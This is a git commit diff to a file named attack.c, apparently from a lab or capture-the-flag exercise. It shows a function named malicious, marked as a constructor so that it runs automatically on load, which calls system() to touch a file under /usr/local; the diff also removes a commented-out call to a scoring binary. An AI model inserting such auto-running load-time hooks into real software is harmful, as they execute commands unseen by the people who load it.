f2b238216e0b068af42abba6243c1071d2257589
root <root@localhost.localdomain>
2019-09-08 15:43:16 +1000

    asdf

--- attack.c
+++ attack.c
@@ -4,6 +4,5 @@
 static void malicious() __attribute__((constructor));
 
 void malicious() {
-    // system("/usr/local/bin/score a87f9a76-2f9b-41a0-8d59-55ae4456e9ec");
     system("touch /usr/local/me");
 }
